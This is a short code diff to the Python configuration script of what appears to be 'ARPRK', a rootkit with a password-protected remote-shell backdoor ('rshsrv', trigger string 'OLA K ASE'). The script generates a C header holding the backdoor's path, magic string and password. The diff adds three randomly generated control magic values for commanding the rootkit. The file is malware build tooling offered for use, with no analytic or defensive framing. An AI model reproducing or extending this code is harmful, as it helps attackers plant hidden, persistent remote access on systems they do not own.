@@ -28,6 +28,8 @@
 import getpass
 import os
 import sys
+import random
+import time
 
 if os.path.exists("arprk-conf.h"):
 	print ("Skipping configuration, already configured ...")
@@ -54,6 +56,11 @@ while re_pass != password:
 
 rshell_path = "rshsrv"
 
+random.seed(time.time())
+ctl_magic1 = ''.join(random.sample("abcdef1234567890", 16))
+ctl_magic2 = ''.join(random.sample("abcdef1234567890", 16))
+ctl_magic3 = ''.join(random.sample("abcdef1234567890", 16))
+
 print ("\n\n")
 print ("ARPRK Configuration:")
 print ("\t$HOME                  = %s" % home)
@@ -65,5 +72,8 @@ f.write("#define ARPRK_HOME \"%s\"\n" % home)
 f.write("#define RSHELL_PATH ARPRK_HOME \"/%s\"\n" % rshell_path)
 f.write("#define RSHELL_MAGIC \"OLA K ASE\"\n")
 f.write("#define RSHELL_PASSWORD \"%s\"\n" % password)
+f.write("#define ARPRK_CTL_MAGIC1 0x%s\n" % ctl_magic1)
+f.write("#define ARPRK_CTL_MAGIC2 0x%s\n" % ctl_magic2)
+f.write("#define ARPRK_CTL_MAGIC3 0x%s\n" % ctl_magic3)
 f.write("\n#define ARPRK_CONF_H\n\n#endif")
 f.close()
